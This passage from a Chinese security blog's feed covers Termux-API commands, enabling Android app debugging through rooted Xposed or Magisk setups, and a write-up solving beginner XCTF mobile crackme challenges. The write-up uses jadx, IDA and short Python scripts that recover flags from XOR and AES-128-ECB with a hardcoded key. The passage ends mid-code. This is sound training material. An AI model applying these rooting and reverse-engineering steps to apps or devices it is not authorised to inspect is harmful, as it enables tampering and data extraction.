apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 <a href="https://play.google.com/store/apps/details?id=com.termux.api" target="_blank" rel="noopener">Termux:API</a> 这一 APP，然后用 apt 安装命令行：</p><pre><code class="bash">apt install termux-api</code></pre><p>获取电池信息：</p><pre><code class="bash">$ termux-battery-status{  &quot;health&quot;: &quot;GOOD&quot;,  &quot;percentage&quot;: 100,  &quot;plugged&quot;: &quot;PLUGGED_USB&quot;,  &quot;status&quot;: &quot;FULL&quot;,  &quot;temperature&quot;: 22.700000762939453,  &quot;current&quot;: -38757}</code></pre><p>获取相机信息：</p><pre><code class="bash">$ termux-camera-info</code></pre><p>获取与设置剪切板：</p><pre><code class="bash">$ termux-clipboard-set thisisassassinq$ termux-clipboard-getthisisassassinq</code></pre><p>获取通讯录列表：</p><pre><code class="bash">$ termux-contact-list</code></pre><p>拨打电话：</p><pre><code class="bash">$ termux-telephony-call 10001</code></pre><p>获取当前 Wi-Fi 连接信息：</p><pre><code class="bash">$ termux-wifi-connectioninfo{  &quot;bssid&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;frequency_mhz&quot;: 2412,  &quot;ip&quot;: &quot;192.168.101.68&quot;,  &quot;link_speed_mbps&quot;: 144,  &quot;mac_address&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;network_id&quot;: 0,  &quot;rssi&quot;: -53,  &quot;ssid&quot;: &quot;&lt;unknown ssid&gt;&quot;,  &quot;ssid_hidden&quot;: true,  &quot;supplicant_state&quot;: &quot;COMPLETED&quot;}</code></pre><p>获取最近一次 Wi-Fi 扫描信息：</p><pre><code class="bash">$ termux-wifi-scaninfo</code></pre><h1 id="nyancat"><a href="#nyancat" class="headerlink" title="nyancat"></a>nyancat</h1><p>彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载：</p><pre><code class="bash">apt install nyancat</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/5.png" srcset="/img/loading.gif" alt></p><h1 id="终端二维码"><a href="#终端二维码" class="headerlink" title="终端二维码"></a>终端二维码</h1><p>生成终端二维码（字体没选好，效果不太好）：</p><pre><code class="bash">echo &quot;https://qianfei11.github.io&quot; | curl -F-=\&lt;- qrenco.de</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/6.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mushuichuan.com/2017/12/10/termux/" target="_blank" rel="noopener">https://mushuichuan.com/2017/12/10/termux/</a><br><a href="http://blackwolfsec.cc/2016/12/10/termux/" target="_blank" rel="noopener">http://blackwolfsec.cc/2016/12/10/termux/</a><br><a href="https://www.sqlsec.com/2018/05/termux.html" target="_blank" rel="noopener">https://www.sqlsec.com/2018/05/termux.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Termux 可以在 Android 上获得极佳的终端体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>不同版本Android动态调试前打开调试开关简述</title>
    <link href="blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/"/>
    <id>blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/</id>
    <published>2020-02-29T02:13:37.000Z</published>
    <updated>2020-03-25T13:00:13.401Z</updated>
    
    <content type="html"><![CDATA[<p>手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 <code>android:debuggable=&quot;true&quot;</code> 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。</p><p>网上还有另外一种修改 Android prop 的工具 <a href="https://github.com/wpvsyou/mprop" target="_blank" rel="noopener">mprop</a>，用来修改 <code>default.prop</code> 中的 <code>ro.debuggable</code> 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。</p><p>最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。</p><h1 id="Android-4"><a href="#Android-4" class="headerlink" title="Android 4"></a>Android 4</h1><p>设备：Nexus 5</p><p>开启动态调试的要求是已 root，并且安装了 Xposed 框架。</p><h2 id="BDOpener"><a href="#BDOpener" class="headerlink" title="BDOpener"></a>BDOpener</h2><p><a href="https://github.com/riusksk/BDOpener" target="_blank" rel="noopener">BDOpener 下载链接</a></p><p>这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。</p><p><img src="/pics/不同版本Android动态调试前打开调试开关简述/1.png" srcset="/img/loading.gif" alt></p><h1 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h1><p>设备：Pixel XL</p><p>开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。</p><h2 id="MagiskHidePropsConf"><a href="#MagiskHidePropsConf" class="headerlink" title="MagiskHidePropsConf"></a><a href="https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-t3789228" target="_blank" rel="noopener">MagiskHidePropsConf</a></h2><p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noopener">MagiskHidePropsConf 下载链接</a></p><p><a href="https://github.com/osm0sis/android-busybox-ndk" target="_blank" rel="noopener">Busybox 下载链接</a></p><p>MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 <code>ro.debuggable</code> 字段了。同时要求安装 Busybox for Android NDK 才能运行。操作如下：</p><pre><code class="sh">marlin:/ # propsLoading... Please wait.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Updating fingerprints list=====================================Checking connection.No connection.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Select an option below.=====================================1 - Edit device fingerprint2 - Device simulation (disabled)3 - Edit MagiskHide props4 - Add/edit custom props5 - Delete prop values6 - Script settings7 - Collect logsr - Reset all options/settingsb - Reboot devicee - ExitSee the module readme or thesupport thread @ XDA for details.Enter your desired option: 3MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== MagiskHide props (active) Select an option below:=====================================Change the sensitive props set by MagiskHide.1 - ro.debuggable2 - ro.secure3 - ro.build.type4 - ro.build.tags5 - ro.build.selinuxa - Change all propsb - Go back to main menue - ExitPick several options at once byseparating inputs with a comma.Example: 1,5,6See the module readme or thesupport thread @ XDA for details.Enter your desired option: 1MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== ro.debuggable=====================================Currently set to 0.You currently have the safe value set.Are you sure you want to change it to 1?Enter y(es), n(o) or e(xit): yMagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Reboot - ro.debuggable=====================================Reboot for changes to take effect.Do you want to reboot now (y/n)?Enter y(es), n(o) or e(xit): yRebooting...</code></pre><p>重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。</p><h2 id="Magisk-命令"><a href="#Magisk-命令" class="headerlink" title="Magisk 命令"></a>Magisk 命令</h2><p>使用 Magisk 的命令也可以实现：</p><pre><code class="bash">magisk resetprop ro.debuggable 1stop; start; # 必须用这种方式重启</code></pre><p>在调试的过程中发现在 Pixel 下如果开了调试会出现开发者选项无法打开的问题，暂时没有解决方法。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</a><br><a href="https://bbs.pediy.com/thread-248322.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248322.htm</a><br><a href="https://www.renyiwei.com/archives/1704.html" target="_blank" rel="noopener">https://www.renyiwei.com/archives/1704.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-MOBILE-新手练习区</title>
    <link href="blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-02-20T11:51:47.000Z</published>
    <updated>2020-04-25T03:30:52.661Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新。</p><a id="more"></a><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码：</p><pre><code class="java">package com.example.yaphetshan.tencentgreat;import android.content.pm.PackageInfo;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    Button btn;    public final String pName = BuildConfig.APPLICATION_ID;    EditText text;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.btn = (Button) findViewById(R.id.checBtn);        this.text = (EditText) findViewById(R.id.input);        this.btn.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                try {                    String inputString = MainActivity.this.text.getText().toString();                    PackageInfo pinfo = MainActivity.this.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY);                    String versionCode = pinfo.versionName; // 获取包信息中的versionName                    int versionName = pinfo.versionCode; // 获取包信息中的versionCode                    int i = 0;                    while (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) {                        if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) { // 将versionCode中的每一字节和versionName异或并和输入比较                            Toast.makeText(MainActivity.this, &quot;\u518d\u63a5\u518d\u5389\uff0c\u52a0\u6cb9~&quot;, 1).show(); // 再接再厉，加油~                            return;                        }                        i++;                    }                    if (inputString.length() == versionCode.length()) { // 判断输入的长度和versionCode是否相同                        Toast.makeText(MainActivity.this, &quot;\u606d\u559c\u5f00\u542f\u95ef\u5173\u4e4b\u95e8\uff01&quot;, 1).show(); // 恭喜开启闯关之门！                        return;                    }                } catch (NameNotFoundException e) {                }                Toast.makeText(MainActivity.this, &quot;\u5e74\u8f7b\u4eba\u4e0d\u8981\u800d\u5c0f\u806a\u660e\u5662&quot;, 1).show(); // 年轻人不要耍小聪明噢            }        });    }}</code></pre><p>代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;15&quot; android:versionName=&quot;X&lt;cP[?PHNB&lt;P?aj&quot; package=&quot;com.example.yaphetshan.tencentgreat&quot; platformBuildVersionCode=&quot;25&quot; platformBuildVersionName=&quot;7.1.1&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;25&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;25.3.0&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;&gt;        &lt;activity android:name=&quot;com.example.yaphetshan.tencentgreat.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>编写脚本来得到 flag：</p><pre><code class="python">#!/usr/bin/env pythonversionCode = 15versionName = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;flag = &#39;&#39;for c in versionName:    flag += chr(ord(c) ^ versionCode)print flag# W3l_T0_GAM3_0ne</code></pre><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity：</p><pre><code class="java">package com.tencent.testvuln;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.os.Handler;import android.support.v4.BuildConfig;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import com.tencent.testvuln.c.SignatureTool;@SuppressLint({&quot;ShowToast&quot;})public class MainActivity extends Activity implements OnClickListener {    private Button a;    private Handler b = null;    private EditText c;    private EditText d;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main);        this.a = (Button) findViewById(R.id.button1);        this.a.setOnClickListener(this);        this.c = (EditText) findViewById(R.id.editText1);        this.d = (EditText) findViewById(R.id.editText2);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putLong(&quot;ili&quot;, System.currentTimeMillis());        edit.commit();        Log.d(&quot;hashcode&quot;, SignatureTool.getSignature(this) + BuildConfig.VERSION_NAME);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }    public void onClick(View view) {        switch (view.getId()) {            case R.id.button1:                if (this.c.getText().length() == 0 || this.d.getText().length() == 0) {                    Toast.makeText(this, &quot;\u4e0d\u80fd\u4e3a\u7a7a&quot;, 1).show(); // 不能为空                    return;                }                String obj = this.c.getText().toString(); // 获取第一个输入框中的字符串                String obj2 = this.d.getText().toString(); // 获取第二个输入框中的字符串                Log.e(&quot;test&quot;, obj + &quot; test2 = &quot; + obj2);                Intent intent = new Intent(this, SecondActivity.class); // 设置Intent跳转到SecondActivity                intent.putExtra(&quot;ili&quot;, obj); // 设置变量ili的值为obj的值                intent.putExtra(&quot;lil&quot;, obj2); // 设置变量lil的值为obj2的值                startActivity(intent); // 调用SecondActivity                return;            default:                return;        }    }}</code></pre><p>接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较：</p><pre><code class="java">package com.tencent.testvuln;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.Toast;import com.tencent.testvuln.c.Encryto;public class SecondActivity extends a {    private BroadcastReceiver c = new BroadcastReceiver(this) {        final /* synthetic */ SecondActivity a;        {            this.a = r1;        }        public void onReceive(Context context, Intent intent) {            Toast.makeText(context, &quot;myReceiver receive&quot;, 0).show();            if (!context.getPackageName().equals(intent.getAction())) {            }        }    };    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main2);        Intent intent = getIntent();        String stringExtra = intent.getStringExtra(&quot;ili&quot;); // obj        String stringExtra2 = intent.getStringExtra(&quot;lil&quot;); // obj2        if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;)) { // 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串            intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);            intent.setClass(this, MoniterInstallService.class);            intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);            intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);            intent.putExtra(&quot;age&quot;, 18);            startActivity(intent);            startService(intent);        }        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;ilil&quot;, stringExtra);        edit.putString(&quot;lili&quot;, stringExtra2);        edit.commit();    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }}</code></pre><p>然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的：</p><pre><code class="java">package com.tencent.testvuln.c;public class Encryto {    public static native int checkSignature(Object obj);    public static native String decode(Object obj, String str);    public static native String doRawData(Object obj, String str);    public static native String encode(Object obj, String str);    public native String HelloLoad();    static {        System.loadLibrary(&quot;JNIEncrypt&quot;);    }}</code></pre><p>用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数：</p><pre><code>.data:00006008 off_6008        DCD aChecksignature_0   ; DATA XREF: register_ndk_load+22↑o.data:00006008                                         ; .text:off_221C↑o.data:00006008                                         ; &quot;checkSignature&quot;.data:0000600C                 DCD aLjavaLangObjec     ; &quot;(Ljava/lang/Object;)I&quot;.data:00006010                 DCD check+1.data:00006014                 DCD aDecode_0           ; &quot;decode&quot;.data:00006018                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:0000601C                 DCD decode+1.data:00006020                 DCD aEncode_0           ; &quot;encode&quot;.data:00006024                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006028                 DCD encode+1.data:0000602C                 DCD aDorawdata_0        ; &quot;doRawData&quot;.data:00006030                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006034                 DCD doRawData+1.data:00006034 ; .data         ends</code></pre><p>看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5：</p><pre><code class="cpp">int __fastcall doRawData(_JNIEnv *env, int a2, int a3, char *string){  _JNIEnv *v4; // r4  char *v5; // r9  const char *utf_string; // r6  int ciphertext; // r8  int result; // r0  jstring (__cdecl *v9)(JNIEnv *, const jchar *, jsize); // r6  char *v10; // r5  size_t v11; // r2  int key; // [sp+0h] [bp-28h]  int v13; // [sp+18h] [bp-10h]  v4 = env;  v5 = string;  if ( j_checkSignature((int)env, a2, a3) == 1    &amp;&amp; (strcpy((char *)&amp;key, &quot;thisisatestkey==&quot;),        utf_string = (const char *)((int (__fastcall *)(_JNIEnv *, char *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)(                                     v4,                                     v5,                                     0),        ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (int)&amp;key),        ((void (__fastcall *)(_JNIEnv *, char *, const char *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string),        result = ((int (__fastcall *)(_JNIEnv *, int))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext),        _stack_chk_guard == v13) )  {    return result;  }  do  {    v9 = v4-&gt;functions-&gt;NewString;    v10 = UNSIGNATURE[0];    v11 = strlen(UNSIGNATURE[0]);  }  while ( _stack_chk_guard != v13 );  result = ((int (__fastcall *)(_JNIEnv *, char *, size_t))v9)(v4, v10, v11);  return result;}</code></pre><p>然后进去看到加密完成之后进行了 base64 加密在返回密文：</p><pre><code class="cpp">int __fastcall AES_128_ECB_PKCS5Padding_Encrypt(const char *a1, int a2){  int v2; // r9  const char *v3; // r10  signed int v4; // r0  signed int v5; // r5  _BYTE *v6; // r11  signed int v7; // r0  const char *v8; // r1  signed int v9; // r8  char *v10; // r10  int v11; // r5  _BYTE *v12; // r0  signed int v13; // r2  char v14; // r6  int v15; // r6  int v16; // r4  int v17; // r5  v2 = a2;  v3 = a1;  v4 = strlen(a1);  v5 = v4;  if ( v4 &lt;= 15 )  {    v6 = malloc(0x10u);    v7 = 0;    do    {      v8 = &amp;byte_3BB0[16 - v5];      if ( v7 &lt; v5 )        v8 = &amp;v3[v7];      v6[v7++] = *v8;    }    while ( v7 != 16 );    v9 = 16;    v10 = (char *)malloc(0x10u);    v11 = 1;LABEL_18:    v15 = 0;    v16 = 0;    do    {      j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]);      ++v16;      v15 += 16;    }    while ( v16 &lt; v11 );    goto LABEL_22;  }  v9 = (v4 + 16) &amp; 0xFFFFFFF0;  v12 = malloc(v9);  v6 = v12;  if ( v9 &lt;= 0 )  {    v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);    goto LABEL_22;  }  v13 = 0;  do  {    if ( v13 &gt;= v5 )    {      if ( !(v5 &amp; 0xF) )      {        v12[v13] = 16;        goto LABEL_15;      }      v14 = byte_3BB0[v9 - v5];    }    else    {      v14 = v3[v13];    }    v12[v13] = v14;LABEL_15:    ++v13;  }  while ( v9 != v13 );  v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);  if ( v9 &gt;= 16 )  {    v11 = v9 / 16;    goto LABEL_18;  }LABEL_22:  v17 = j_b64_encode((int)v10, v9);  free(v6);  free(v10);  return v17;}</code></pre><p>用 Python 脚本解密得到明文：</p><pre><code class="python">#!/usr/bin/env pythonfrom Crypto.Cipher import AESkey = &#39;thisisatestkey==&#39;aes = AES.new(key, AES.MODE_ECB)ciphertext = &#39;VEIzd/V2UPYNdn/bxH3Xig==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext)# aimagetencent</code></pre><p>尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样：</p><pre><code class="java">package com.tencent.testvuln;import android.os.Bundle;import android.widget.TextView;import com.tencent.testvuln.c.Encryto;public class FileDataActivity extends a {    private TextView c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main3);        this.c = (TextView) findViewById(R.id.textView1);        this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;));    }}</code></pre><p>最后用这里的密文解密得到了 flag：</p><pre><code class="python">...ciphertext2 = &#39;9YuQ2dk8CSaCe7DTAmaqAA==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext2)# Cas3_0f_A_CAK3</code></pre><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>拿到文件用 file 没有识别出来，xxd 看一下：</p><pre><code class="bash">$ xxd app3.ab | head00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32  ANDROID BACKUP.200000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f  .1.none.x..z._.o00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797  ...t....]c.a0:G.00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328  .&quot;=....H...s0F#(00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202  *e....F#.&quot;H..RR.00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf  .}..u....&lt;9...u.00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0  ...u}.......PE..00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c  ......A.(..G./*,00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be  ..#@!.......G.S.00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37  .R.P...E)x.....7</code></pre><p>搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压：</p><pre><code class="bash">$ java -jar abe.jar unpack app3.ab app3.tar &quot;&quot;0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%9097216 bytes written to /Users/assassinq/Downloads/app3.tar.</code></pre><p>在解压得到的 tar 包：</p><pre><code class="bash">$ x app3.tarx apps/com.example.yaphetshan.tencentwelcome/a/base.apkx apps/com.example.yaphetshan.tencentwelcome/db/Demo.dbx apps/com.example.yaphetshan.tencentwelcome/Encryto.dbx apps/com.example.yaphetshan.tencentwelcome/_manifest</code></pre><p>生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 <code>a()</code> 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.ContentValues;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import com.example.yaphetshan.tencentwelcome.a.a;import net.sqlcipher.database.SQLiteDatabase;public class MainActivity extends AppCompatActivity implements OnClickListener {    private SQLiteDatabase a;    private a b;    private Button c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.c = (Button) findViewById(R.id.add_data);        this.c.setOnClickListener(this);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;Is_Encroty&quot;, &quot;1&quot;); // Is_Encroty=&quot;1&quot;        edit.putString(&quot;Encryto&quot;, &quot;SqlCipher&quot;); // Encryto=&quot;SqlCipher&quot;        edit.putString(&quot;ver_sion&quot;, &quot;3_4_0&quot;); // ver_sion=&quot;3_4_0&quot;        edit.apply();        a();    }    private void a() {        SQLiteDatabase.loadLibs(this);        this.b = new a(this, &quot;Demo.db&quot;, null, 1); // 打开Demo.db        ContentValues contentValues = new ContentValues();        contentValues.put(&quot;name&quot;, &quot;Stranger&quot;); // name=&quot;Stanger&quot;        contentValues.put(&quot;password&quot;, Integer.valueOf(123456)); // password=123456        a aVar = new a();        String a = aVar.a(contentValues.getAsString(&quot;name&quot;), contentValues.getAsString(&quot;password&quot;)); // a = name[:4] + password[:4]        this.a = this.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)); // 将SHA1(a+MD5(a)+&quot;yaphetshan&quot;)[:7]作为密码，获取指定数据库接口        this.a.insert(&quot;TencentMicrMsg&quot;, null, contentValues); // 将数据contentValues插入表TencentMicrMsg    }    public void onClick(View view) {        if (view == this.c) {            Intent intent = new Intent();            intent.putExtra(&quot;name&quot;, &quot;name&quot;);            intent.putExtra(&quot;password&quot;, &quot;pass&quot;);            intent.setClass(this, AnotherActivity.class);            startActivity(intent);        }    }}</code></pre><p>在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.Context;import net.sqlcipher.database.SQLiteDatabase;import net.sqlcipher.database.SQLiteDatabase.CursorFactory;import net.sqlcipher.database.SQLiteOpenHelper;/* compiled from: DatabaseManager */public class a extends SQLiteOpenHelper {    private int a = 0;    public a(Context context, String str, CursorFactory cursorFactory, int 